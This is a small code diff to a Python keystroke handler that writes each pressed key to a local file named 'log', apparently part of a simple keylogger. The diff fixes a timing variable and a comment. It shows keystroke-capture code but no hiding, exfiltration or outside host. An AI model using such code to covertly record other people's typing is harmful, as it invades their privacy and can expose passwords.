@@ -14,7 +14,7 @@ def on_press(key):
     Saves keyboard input into the log file
     """
 
-    time_zero = time.time()
+    global time_zero
 
     try:
         with open("log", "a+") as f:
@@ -22,7 +22,7 @@ def on_press(key):
                 f.write("\n")
             else:
                 # If time difference between last alphanumerical input
-                # is greater than 10s, inserts as newline
+                # is greater than 5s, inserts as newline
                 if time.time() - time_zero > 5:
                     f.write("\n")
                 f.write(key.char)
